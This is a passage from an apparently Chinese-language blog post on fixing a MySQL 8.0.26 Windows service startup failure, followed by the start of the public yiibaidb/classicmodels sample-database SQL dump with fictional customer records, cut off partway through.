24032 TCP 127.0.0.1:3306 127.0.0.1:51669 ESTABLISHED 24032 TCP 127.0.0.1:3306 127.0.0.1:51672 ESTABLISHED 24032 TCP 127.0.0.1:3306 127.0.0.1:51673 ESTABLISHED 24032 TCP 127.0.0.1:51668 127.0.0.1:3306 ESTABLISHED 21336 TCP 127.0.0.1:51669 127.0.0.1:3306 ESTABLISHED 21336 TCP 127.0.0.1:51672 127.0.0.1:3306 ESTABLISHED 21336 TCP 127.0.0.1:51673 127.0.0.1:3306 ESTABLISHED 21336 TCP [::]:3306 [::]:0 LISTENING 24032 TCP [::]:33060 [::]:0 LISTENING 24032 TCP [::1]:51535 [::1]:3306 TIME_WAIT 0 \\mysql-8.0.26-winx64\\bin\u0026gt;tasklist|findstr \u0026#34;mysqld\u0026#34; mysqld.exe 23212 Services 0 15,484 K mysqld.exe 24032 Services 0 191,632 K D:\\Program Files (x86)\\mysql-8.0.26-winx64\\bin\u0026gt;   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  $ net start mysql MySQL 服务正在启动 . MySQL 服务无法启动。 服务没有报告任何错误。 请键入 NET HELPMSG 3534 以获得更多的帮助。 # 使用--console 显示上面的报错信息 $ mysqld --console 2021-10-19T02:16:50.682868Z 0 [System] [MY-010116] [Server] D:\\Program Files (x86)\\mysql-8.0.26-winx64\\bin\\mysqld.exe (mysqld 8.0.26) starting as process 24392 2021-10-19T02:16:50.707857Z 1 [ERROR] [MY-011011] [Server] Failed to find valid data directory. 2021-10-19T02:16:50.708529Z 0 [ERROR] [MY-010020] [Server] Data Dictionary initialization failed. 2021-10-19T02:16:50.708748Z 0 [ERROR] [MY-010119] [Server] Aborting 2021-10-19T02:16:50.709331Z 0 [System] [MY-010910] [Server] D:\\Program Files (x86)\\mysql-8.0.26-winx64\\bin\\mysqld.exe: Shutdown complete (mysqld 8.0.26) MySQL Community Server - GPL.   1 2 3 4 5 6 7 8 9 10 11 12  mysqld -remove Service successfully removed. mysqld --initialize-insecure mysqld -install Service successfully installed. $ net start mysql MySQL 服务正在启动 . MySQL 服务已经启动成功。   1 2 3 4 5 6 7 8  net stop mysql MySQL 服务正在停止. MySQL 服务已成功停止。 mysqld -remove Service successfully removed.   测试sql 1 2 3 4 5 6 7  # 创建测试数据库 CREATE DATABASE IF NOT EXISTS yiibaidb DEFAULT CHARSET utf8 COLLATE utf8_general_ci; use yiibaidb; # 导入sql source D:/yiibaidb.sql;   ER图 yiibaidb.sqlhttp://www.yiibai.com/mysql/ ********************************************************************* Name: MySQL Sample Database classicmodels Link: http://www.yiibai.com/mysql/sample-database.html ********************************************************************* */ /*!40101 SET NAMES utf8 */; /*!40101 SET SQL_MODE=\u0026#39;\u0026#39;*/; /*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */; /*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */; /*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=\u0026#39;NO_AUTO_VALUE_ON_ZERO\u0026#39; */; /*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */; CREATE DATABASE /*!32312 IF NOT EXISTS*/`yiibaidb` /*!40100 DEFAULT CHARACTER SET utf8 */; USE `yiibaidb`; /* Navicat MySQL Data Transfer Source Server : localhost-57 Source Server Version : 50709 Source Host : localhost:3306 Source Database : yiibaidb Target Server Type : MYSQL Target Server Version : 50709 File Encoding : 65001 Date: 2017-07-20 21:08:41 */ SET FOREIGN_KEY_CHECKS=0; -- ---------------------------- -- Table structure for `customers` -- ---------------------------- DROP TABLE IF EXISTS `customers`; CREATE TABLE `customers` ( `customerNumber` int(11) NOT NULL, `customerName` varchar(50) NOT NULL, `contactLastName` varchar(50) NOT NULL, `contactFirstName` varchar(50) NOT NULL, `phone` varchar(50) NOT NULL, `addressLine1` varchar(50) NOT NULL, `addressLine2` varchar(50) DEFAULT NULL, `city` varchar(50) NOT NULL, `state` varchar(50) DEFAULT NULL, `postalCode` varchar(15) DEFAULT NULL, `country` varchar(50) NOT NULL, `salesRepEmployeeNumber` int(11) DEFAULT NULL, `creditLimit` decimal(10,2) DEFAULT NULL, PRIMARY KEY (`customerNumber`), KEY `salesRepEmployeeNumber` (`salesRepEmployeeNumber`), CONSTRAINT `customers_ibfk_1` FOREIGN KEY (`salesRepEmployeeNumber`) REFERENCES `employees` (`employeeNumber`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; -- ---------------------------- -- Records of customers -- ---------------------------- INSERT INTO `customers` VALUES (\u0026#39;103\u0026#39;, \u0026#39;Atelier graphique\u0026#39;, \u0026#39;Schmitt\u0026#39;, \u0026#39;Carine \u0026#39;, \u0026#39;40.32.2555\u0026#39;, \u0026#39;54, rue Royale\u0026#39;, null, \u0026#39;Nantes\u0026#39;, null, \u0026#39;44000\u0026#39;, \u0026#39;France\u0026#39;, \u0026#39;1370\u0026#39;, \u0026#39;21000.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;112\u0026#39;, \u0026#39;Signal Gift Stores\u0026#39;, \u0026#39;King\u0026#39;, \u0026#39;Jean\u0026#39;, \u0026#39;7025551838\u0026#39;, \u0026#39;8489 Strong St.\u0026#39;, null, \u0026#39;Las Vegas\u0026#39;, \u0026#39;NV\u0026#39;, \u0026#39;83030\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1166\u0026#39;, \u0026#39;71800.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;114\u0026#39;, \u0026#39;Australian Collectors, Co.\u0026#39;, \u0026#39;Ferguson\u0026#39;, \u0026#39;Peter\u0026#39;, \u0026#39;03 9520 4555\u0026#39;, \u0026#39;636 St Kilda Road\u0026#39;, \u0026#39;Level 3\u0026#39;, \u0026#39;Melbourne\u0026#39;, \u0026#39;Victoria\u0026#39;, \u0026#39;3004\u0026#39;, \u0026#39;Australia\u0026#39;, \u0026#39;1611\u0026#39;, \u0026#39;117300.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;119\u0026#39;, \u0026#39;La Rochelle Gifts\u0026#39;, \u0026#39;Labrune\u0026#39;, \u0026#39;Janine \u0026#39;, \u0026#39;40.67.8555\u0026#39;, \u0026#39;67, rue des Cinquante Otages\u0026#39;, null, \u0026#39;Nantes\u0026#39;, null, \u0026#39;44000\u0026#39;, \u0026#39;France\u0026#39;, \u0026#39;1370\u0026#39;, \u0026#39;118200.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;121\u0026#39;, \u0026#39;Baane Mini Imports\u0026#39;, \u0026#39;Bergulfsen\u0026#39;, \u0026#39;Jonas \u0026#39;, \u0026#39;07-98 9555\u0026#39;, \u0026#39;Erling Skakkes gate 78\u0026#39;, null, \u0026#39;Stavern\u0026#39;, null, \u0026#39;4110\u0026#39;, \u0026#39;Norway\u0026#39;, \u0026#39;1504\u0026#39;, \u0026#39;81700.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;124\u0026#39;, \u0026#39;Mini Gifts Distributors Ltd.\u0026#39;, \u0026#39;Nelson\u0026#39;, \u0026#39;Susan\u0026#39;, \u0026#39;4155551450\u0026#39;, \u0026#39;5677 Strong St.\u0026#39;, null, \u0026#39;San Rafael\u0026#39;, \u0026#39;CA\u0026#39;, \u0026#39;97562\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1165\u0026#39;, \u0026#39;210500.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;125\u0026#39;, \u0026#39;Havel \u0026amp; Zbyszek Co\u0026#39;, \u0026#39;Piestrzeniewicz\u0026#39;, \u0026#39;Zbyszek \u0026#39;, \u0026#39;(26) 642-7555\u0026#39;, \u0026#39;ul. Filtrowa 68\u0026#39;, null, \u0026#39;Warszawa\u0026#39;, null, \u0026#39;01-012\u0026#39;, \u0026#39;Poland\u0026#39;, null, \u0026#39;0.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;128\u0026#39;, \u0026#39;Blauer See Auto, Co.\u0026#39;, \u0026#39;Keitel\u0026#39;, \u0026#39;Roland\u0026#39;, \u0026#39;+49 69 66 90 2555\u0026#39;, \u0026#39;Lyonerstr. 34\u0026#39;, null, \u0026#39;Frankfurt\u0026#39;, null, \u0026#39;60528\u0026#39;, \u0026#39;Germany\u0026#39;, \u0026#39;1504\u0026#39;, \u0026#39;59700.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;129\u0026#39;, \u0026#39;Mini Wheels Co.\u0026#39;, \u0026#39;Murphy\u0026#39;, \u0026#39;Julie\u0026#39;, \u0026#39;6505555787\u0026#39;, \u0026#39;5557 North Pendale Street\u0026#39;, null, \u0026#39;San Francisco\u0026#39;, \u0026#39;CA\u0026#39;, \u0026#39;94217\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1165\u0026#39;, \u0026#39;64600.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;131\u0026#39;, \u0026#39;Land of Toys Inc.\u0026#39;, \u0026#39;Lee\u0026#39;, \u0026#39;Kwai\u0026#39;, \u0026#39;2125557818\u0026#39;, \u0026#39;897 Long Airport Avenue\u0026#39;, null, \u0026#39;NYC\u0026#39;, \u0026#39;NY\u0026#39;, \u0026#39;10022\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1323\u0026#39;, \u0026#39;114900.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;141\u0026#39;, \u0026#39;Euro+ Shopping Channel\u0026#39;, \u0026#39;Freyre\u0026#39;, \u0026#39;Diego \u0026#39;, \u0026#39;(91) 555 94 44\u0026#39;, \u0026#39;C/ Moralzarzal, 86\u0026#39;, null, \u0026#39;Madrid\u0026#39;, null, \u0026#39;28034\u0026#39;, \u0026#39;Spain\u0026#39;, \u0026#39;1370\u0026#39;, \u0026#39;227600.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;144\u0026#39;, \u0026#39;Volvo Model Replicas, Co\u0026#39;, \u0026#39;Berglund\u0026#39;, \u0026#39;Christina \u0026#39;, \u0026#39;0921-12 3555\u0026#39;, \u0026#39;Berguvsv gen 8\u0026#39;, null, \u0026#39;Lule\u0026#39;, null, \u0026#39;S-958 22\u0026#39;, \u0026#39;Sweden\u0026#39;, \u0026#39;1504\u0026#39;, \u0026#39;53100.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;145\u0026#39;, \u0026#39;Danish Wholesale Imports\u0026#39;, \u0026#39;Petersen\u0026#39;, \u0026#39;Jytte \u0026#39;, \u0026#39;31 12 3555\u0026#39;, \u0026#39;Vinb ltet 34\u0026#39;, null, \u0026#39;Kobenhavn\u0026#39;, null, \u0026#39;1734\u0026#39;, \u0026#39;Denmark\u0026#39;, \u0026#39;1401\u0026#39;, \u0026#39;83400.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;146\u0026#39;, \u0026#39;Saveley \u0026amp; Henriot, Co.\u0026#39;, \u0026#39;Saveley\u0026#39;, \u0026#39;Mary \u0026#39;, \u0026#39;78.32.5555\u0026#39;, \u0026#39;2, rue du Commerce\u0026#39;, null, \u0026#39;Lyon\u0026#39;, null, \u0026#39;69004\u0026#39;, \u0026#39;France\u0026#39;, \u0026#39;1337\u0026#39;, \u0026#39;123900.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;148\u0026#39;, \u0026#39;Dragon Souveniers, Ltd.\u0026#39;, \u0026#39;Natividad\u0026#39;, \u0026#39;Eric\u0026#39;, \u0026#39;+65 221 7555\u0026#39;, \u0026#39;Bronz Sok.\u0026#39;, \u0026#39;Bronz Apt. 3/6 Tesvikiye\u0026#39;, \u0026#39;Singapore\u0026#39;, null, \u0026#39;079903\u0026#39;, \u0026#39;Singapore\u0026#39;, \u0026#39;1621\u0026#39;, \u0026#39;103800.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;151\u0026#39;, \u0026#39;Muscle Machine Inc\u0026#39;, \u0026#39;Young\u0026#39;, \u0026#39;Jeff\u0026#39;, \u0026#39;2125557413\u0026#39;, \u0026#39;4092 Furth Circle\u0026#39;, \u0026#39;Suite 400\u0026#39;, \u0026#39;NYC\u0026#39;, \u0026#39;NY\u0026#39;, \u0026#39;10022\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1286\u0026#39;, \u0026#39;138500.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;157\u0026#39;, \u0026#39;Diecast Classics Inc.\u0026#39;, \u0026#39;Leong\u0026#39;, \u0026#39;Kelvin\u0026#39;, \u0026#39;2155551555\u0026#39;, \u0026#39;7586 Pompton St.\u0026#39;, null, \u0026#39;Allentown\u0026#39;, \u0026#39;PA\u0026#39;, \u0026#39;70267\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1216\u0026#39;, \u0026#39;100600.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;161\u0026#39;, \u0026#39;Technics Stores Inc.\u0026#39;, \u0026#39;Hashimoto\u0026#39;, \u0026#39;Juri\u0026#39;, \u0026#39;6505556809\u0026#39;, \u0026#39;9408 Furth Circle\u0026#39;, null, \u0026#39;Burlingame\u0026#39;, \u0026#39;CA\u0026#39;, \u0026#39;94217\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1165\u0026#39;, \u0026#39;84600.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;166\u0026#39;, \u0026#39;Handji Gifts\u0026amp; Co\u0026#39;, \u0026#39;Victorino\u0026#39;, \u0026#39;Wendy\u0026#39;, \u0026#39;+65 224 1555\u0026#39;, \u0026#39;106 Linden Road Sandown\u0026#39;, \u0026#39;2nd Floor\u0026#39;, \u0026#39;Singapore\u0026#39;, null, \u0026#39;069045\u0026#39;, \u0026#39;Singapore\u0026#39;, \u0026#39;1612\u0026#39;, \u0026#39;97900.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;167\u0026#39;, \u0026#39;Herkku Gifts\u0026#39;, \u0026#39;Oeztan\u0026#39;, \u0026#39;Veysel\u0026#39;, \u0026#39;+47 2267 3215\u0026#39;, \u0026#39;Brehmen St. 121\u0026#39;, \u0026#39;PR 334 Sentrum\u0026#39;, \u0026#39;Bergen\u0026#39;, null, \u0026#39;N 5804\u0026#39;, \u0026#39;Norway \u0026#39;, \u0026#39;1504\u0026#39;, \u0026#39;96800.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;168\u0026#39;, \u0026#39;American Souvenirs Inc\u0026#39;, \u0026#39;Franco\u0026#39;, \u0026#39;Keith\u0026#39;, \u0026#39;2035557845\u0026#39;, \u0026#39;149 Spinnaker Dr.\u0026#39;, \u0026#39;Suite 101\u0026#39;, \u0026#39;New Haven\u0026#39;, \u0026#39;CT\u0026#39;, \u0026#39;97823\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1286\u0026#39;, \u0026#39;0.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;169\u0026#39;, \u0026#39;Porto Imports Co.\u0026#39;, \u0026#39;de Castro\u0026#39;, \u0026#39;Isabel \u0026#39;, \u0026#39;(1) 356-5555\u0026#39;, \u0026#39;Estrada da sade n. 58\u0026#39;, null, \u0026#39;Lisboa\u0026#39;, null, \u0026#39;1756\u0026#39;, \u0026#39;Portugal\u0026#39;, null, \u0026#39;0.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;171\u0026#39;, \u0026#39;Daedalus Designs Imports\u0026#39;, \u0026#39;Ranc\u0026#39;, \u0026#39;Martine \u0026#39;, \u0026#39;20.16.1555\u0026#39;, \u0026#39;184, chausse de Tournai\u0026#39;, null, \u0026#39;Lille\u0026#39;, null, \u0026#39;59000\u0026#39;, \u0026#39;France\u0026#39;, \u0026#39;1370\u0026#39;, \u0026#39;82900.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;172\u0026#39;, \u0026#39;La Corne D\\\u0026#39;abondance, Co.\u0026#39;, \u0026#39;Bertrand\u0026#39;, \u0026#39;Marie\u0026#39;, \u0026#39;(1) 42.34.2555\u0026#39;, \u0026#39;265, boulevard Charonne\u0026#39;, null, \u0026#39;Paris\u0026#39;, null, \u0026#39;75012\u0026#39;, \u0026#39;France\u0026#39;, \u0026#39;1337\u0026#39;, \u0026#39;84300.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;173\u0026#39;, \u0026#39;Cambridge Collectables Co.\u0026#39;, \u0026#39;Tseng\u0026#39;, \u0026#39;Jerry\u0026#39;, \u0026#39;6175555555\u0026#39;, \u0026#39;4658 Baden Av.\u0026#39;, null, \u0026#39;Cambridge\u0026#39;, \u0026#39;MA\u0026#39;, \u0026#39;51247\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1188\u0026#39;, \u0026#39;43400.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;175\u0026#39;, \u0026#39;Gift Depot Inc.\u0026#39;, \u0026#39;King\u0026#39;, \u0026#39;Julie\u0026#39;, \u0026#39;2035552570\u0026#39;, \u0026#39;25593 South Bay Ln.\u0026#39;, null, \u0026#39;Bridgewater\u0026#39;, \u0026#39;CT\u0026#39;, \u0026#39;97562\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1323\u0026#39;, \u0026#39;84300.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;177\u0026#39;, \u0026#39;Osaka Souveniers Co.\u0026#39;, \u0026#39;Kentary\u0026#39;, \u0026#39;Mory\u0026#39;, \u0026#39;+81 06 6342 5555\u0026#39;, \u0026#39;1-6-20 Dojima\u0026#39;, null, \u0026#39;Kita-ku\u0026#39;, \u0026#39;Osaka\u0026#39;, \u0026#39; 530-0003\u0026#39;, \u0026#39;Japan\u0026#39;, \u0026#39;1621\u0026#39;, \u0026#39;81200.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;181\u0026#39;, \u0026#39;Vitachrome Inc.\u0026#39;, \u0026#39;Frick\u0026#39;, \u0026#39;Michael\u0026#39;, \u0026#39;2125551500\u0026#39;, \u0026#39;2678 Kingston Rd.\u0026#39;, \u0026#39;Suite 101\u0026#39;, \u0026#39;NYC\u0026#39;, \u0026#39;NY\u0026#39;, \u0026#39;10022\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1286\u0026#39;, \u0026#39;76400.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;186\u0026#39;, \u0026#39;Toys of Finland, Co.\u0026#39;, \u0026#39;Karttunen\u0026#39;, \u0026#39;Matti\u0026#39;, \u0026#39;90-224 8555\u0026#39;, \u0026#39;Keskuskatu 45\u0026#39;, null, \u0026#39;Helsinki\u0026#39;, null, \u0026#39;21240\u0026#39;, \u0026#39;Finland\u0026#39;, \u0026#39;1501\u0026#39;, \u0026#39;96500.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;187\u0026#39;, \u0026#39;AV Stores, Co.\u0026#39;, \u0026#39;Ashworth\u0026#39;, \u0026#39;Rachel\u0026#39;, \u0026#39;(171) 555-1555\u0026#39;, \u0026#39;Fauntleroy Circus\u0026#39;, null, \u0026#39;Manchester\u0026#39;, null, \u0026#39;EC2 5NT\u0026#39;, \u0026#39;UK\u0026#39;, \u0026#39;1501\u0026#39;, \u0026#39;136800.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;189\u0026#39;, \u0026#39;Clover Collections, Co.\u0026#39;, \u0026#39;Cassidy\u0026#39;, \u0026#39;Dean\u0026#39;, \u0026#39;+353 1862 1555\u0026#39;, \u0026#39;25 Maiden Lane\u0026#39;, \u0026#39;Floor No. 4\u0026#39;, \u0026#39;Dublin\u0026#39;, null, \u0026#39;2\u0026#39;, \u0026#39;Ireland\u0026#39;, \u0026#39;1504\u0026#39;, \u0026#39;69400.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;198\u0026#39;, \u0026#39;Auto-Moto Classics Inc.\u0026#39;, \u0026#39;Taylor\u0026#39;, \u0026#39;Leslie\u0026#39;, \u0026#39;6175558428\u0026#39;, \u0026#39;16780 Pompton St.\u0026#39;, null, \u0026#39;Brickhaven\u0026#39;, \u0026#39;MA\u0026#39;, \u0026#39;58339\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1216\u0026#39;, \u0026#39;23000.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;201\u0026#39;, \u0026#39;UK Collectables, Ltd.\u0026#39;, \u0026#39;Devon\u0026#39;, \u0026#39;Elizabeth\u0026#39;, \u0026#39;(171) 555-2282\u0026#39;, \u0026#39;12, Berkeley Gardens Blvd\u0026#39;, null, \u0026#39;Liverpool\u0026#39;, null, \u0026#39;WX1 6LT\u0026#39;, \u0026#39;UK\u0026#39;, \u0026#39;1501\u0026#39;, \u0026#39;92700.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;202\u0026#39;, \u0026#39;Canadian Gift Exchange Network\u0026#39;, \u0026#39;Tamuri\u0026#39;, \u0026#39;Yoshi \u0026#39;, \u0026#39;(604) 555-3392\u0026#39;, \u0026#39;1900 Oak St.\u0026#39;, null, \u0026#39;Vancouver\u0026#39;, \u0026#39;BC\u0026#39;, \u0026#39;V3F 2K1\u0026#39;, \u0026#39;Canada\u0026#39;, \u0026#39;1323\u0026#39;, \u0026#39;90300.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;204\u0026#39;, \u0026#39;Online Mini Collectables\u0026#39;, \u0026#39;Barajas\u0026#39;, \u0026#39;Miguel\u0026#39;, \u0026#39;6175557555\u0026#39;, \u0026#39;7635 Spinnaker Dr.\u0026#39;, null, \u0026#39;Brickhaven\u0026#39;, \u0026#39;MA\u0026#39;, \u0026#39;58339\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1188\u0026#39;, \u0026#39;68700.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;205\u0026#39;, \u0026#39;Toys4GrownUps.com\u0026#39;, \u0026#39;Young\u0026#39;, \u0026#39;Julie\u0026#39;, \u0026#39;6265557265\u0026#39;, \u0026#39;78934 Hillside Dr.\u0026#39;, null, \u0026#39;Pasadena\u0026#39;, \u0026#39;CA\u0026#39;, \u0026#39;90003\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1166\u0026#39;, \u0026#39;90700.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;206\u0026#39;, \u0026#39;Asian Shopping Network, Co\u0026#39;, \u0026#39;Walker\u0026#39;, \u0026#39;Brydey\u0026#39;, \u0026#39;+612 9411 1555\u0026#39;, \u0026#39;Suntec Tower Three\u0026#39;, \u0026#39;8 Temasek\u0026#39;, \u0026#39;Singapore\u0026#39;, null, \u0026#39;038988\u0026#39;, \u0026#39;Singapore\u0026#39;, null, \u0026#39;0.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;209\u0026#39;, \u0026#39;Mini Caravy\u0026#39;, \u0026#39;Citeaux\u0026#39;, \u0026#39;Frdrique \u0026#39;, \u0026#39;88.60.1555\u0026#39;, \u0026#39;24, place Klber\u0026#39;, null, \u0026#39;Strasbourg\u0026#39;, null, \u0026#39;67000\u0026#39;, \u0026#39;France\u0026#39;, \u0026#39;1370\u0026#39;, \u0026#39;53800.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;211\u0026#39;, \u0026#39;King Kong Collectables, Co.\u0026#39;, \u0026#39;Gao\u0026#39;, \u0026#39;Mike\u0026#39;, \u0026#39;+852 2251 1555\u0026#39;, \u0026#39;Bank of China Tower\u0026#39;, \u0026#39;1 Garden Road\u0026#39;, \u0026#39;Central Hong Kong\u0026#39;, null, null, \u0026#39;Hong Kong\u0026#39;, \u0026#39;1621\u0026#39;, \u0026#39;58600.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;216\u0026#39;, \u0026#39;Enaco Distributors\u0026#39;, \u0026#39;Saavedra\u0026#39;, \u0026#39;Eduardo \u0026#39;, \u0026#39;(93) 203 4555\u0026#39;, \u0026#39;Rambla de Catalua, 23\u0026#39;, null, \u0026#39;Barcelona\u0026#39;, null, \u0026#39;08022\u0026#39;, \u0026#39;Spain\u0026#39;, \u0026#39;1702\u0026#39;, \u0026#39;60300.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;219\u0026#39;, \u0026#39;Boards \u0026amp; Toys Co.\u0026#39;, \u0026#39;Young\u0026#39;, \u0026#39;Mary\u0026#39;, \u0026#39;3105552373\u0026#39;, \u0026#39;4097 Douglas Av.\u0026#39;, null, \u0026#39;Glendale\u0026#39;, \u0026#39;CA\u0026#39;, \u0026#39;92561\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1166\u0026#39;, \u0026#39;11000.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;223\u0026#39;, \u0026#39;Natrlich Autos\u0026#39;, \u0026#39;Kloss\u0026#39;, \u0026#39;Horst \u0026#39;, \u0026#39;0372-555188\u0026#39;, \u0026#39;Taucherstrae 10\u0026#39;, null, \u0026#39;Cunewalde\u0026#39;, null, \u0026#39;01307\u0026#39;, \u0026#39;Germany\u0026#39;, null, \u0026#39;0.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;227\u0026#39;, \u0026#39;Heintze Collectables\u0026#39;, \u0026#39;Ibsen\u0026#39;, \u0026#39;Palle\u0026#39;, \u0026#39;86 21 3555\u0026#39;, \u0026#39;Smagsloget 45\u0026#39;, null, \u0026#39;Brhus\u0026#39;, null, \u0026#39;8200\u0026#39;, \u0026#39;Denmark\u0026#39;, \u0026#39;1401\u0026#39;, \u0026#39;120800.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;233\u0026#39;, \u0026#39;Qubec Home Shopping Network\u0026#39;, \u0026#39;Fresnire\u0026#39;, \u0026#39;Jean \u0026#39;, \u0026#39;(514) 555-8054\u0026#39;, \u0026#39;43 rue St. Laurent\u0026#39;, null, \u0026#39;Montral\u0026#39;, \u0026#39;Qubec\u0026#39;, \u0026#39;H1J 1C3\u0026#39;, \u0026#39;Canada\u0026#39;, \u0026#39;1286\u0026#39;, \u0026#39;48700.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;237\u0026#39;, \u0026#39;ANG Resellers\u0026#39;, \u0026#39;Camino\u0026#39;, \u0026#39;Alejandra \u0026#39;, \u0026#39;(91) 745 6555\u0026#39;, \u0026#39;Gran Va, 1\u0026#39;, null, \u0026#39;Madrid\u0026#39;, null, \u0026#39;28001\u0026#39;, \u0026#39;Spain\u0026#39;, null, \u0026#39;0.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;239\u0026#39;, \u0026#39;Collectable Mini Designs Co.\u0026#39;, \u0026#39;Thompson\u0026#39;, \u0026#39;Valarie\u0026#39;, \u0026#39;7605558146\u0026#39;, \u0026#39;361 Furth Circle\u0026#39;, null, \u0026#39;San Diego\u0026#39;, \u0026#39;CA\u0026#39;, \u0026#39;91217\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1166\u0026#39;, \u0026#39;105000.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;240\u0026#39;, \u0026#39;giftsbymail.co.uk\u0026#39;, \u0026#39;Bennett\u0026#39;, \u0026#39;Helen \u0026#39;, \u0026#39;(198) 555-8888\u0026#39;, \u0026#39;Garden House\u0026#39;, \u0026#39;Crowther Way 23\u0026#39;, \u0026#39;Cowes\u0026#39;, \u0026#39;Isle of Wight\u0026#39;, \u0026#39;PO31 7PJ\u0026#39;, \u0026#39;UK\u0026#39;, \u0026#39;1501\u0026#39;, \u0026#39;93900.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;242\u0026#39;, \u0026#39;Alpha Cognac\u0026#39;, \u0026#39;Roulet\u0026#39;, \u0026#39;Annette \u0026#39;, \u0026#39;61.77.6555\u0026#39;, \u0026#39;1 rue Alsace-Lorraine\u0026#39;, null, \u0026#39;Toulouse\u0026#39;, null, \u0026#39;31000\u0026#39;, \u0026#39;France\u0026#39;, \u0026#39;1370\u0026#39;, \u0026#39;61100.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;247\u0026#39;, \u0026#39;Messner Shopping Network\u0026#39;, \u0026#39;Messner\u0026#39;, \u0026#39;Renate \u0026#39;, \u0026#39;069-0555984\u0026#39;, \u0026#39;Magazinweg 7\u0026#39;, null, \u0026#39;Frankfurt\u0026#39;, null, \u0026#39;60528\u0026#39;, \u0026#39;Germany\u0026#39;, null, \u0026#39;0.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;249\u0026#39;, \u0026#39;Amica Models \u0026amp; Co.\u0026#39;, \u0026#39;Accorti\u0026#39;, \u0026#39;Paolo \u0026#39;, \u0026#39;011-4988555\u0026#39;, \u0026#39;Via Monte Bianco 34\u0026#39;, null, \u0026#39;Torino\u0026#39;, null, \u0026#39;10100\u0026#39;, \u0026#39;Italy\u0026#39;, \u0026#39;1401\u0026#39;, \u0026#39;113000.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;250\u0026#39;, \u0026#39;Lyon Souveniers\u0026#39;, \u0026#39;Da Silva\u0026#39;, \u0026#39;Daniel\u0026#39;, \u0026#39;+33 1 46 62 7555\u0026#39;, \u0026#39;27 rue du Colonel Pierre Avia\u0026#39;, null, \u0026#39;Paris\u0026#39;, null, \u0026#39;75508\u0026#39;, \u0026#39;France\u0026#39;, \u0026#39;1337\u0026#39;, \u0026#39;68100.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;256\u0026#39;, \u0026#39;Auto Associs \u0026amp; Cie.\u0026#39;, \u0026#39;Tonini\u0026#39;, \u0026#39;Daniel \u0026#39;, \u0026#39;30.59.8555\u0026#39;, \u0026#39;67, avenue de 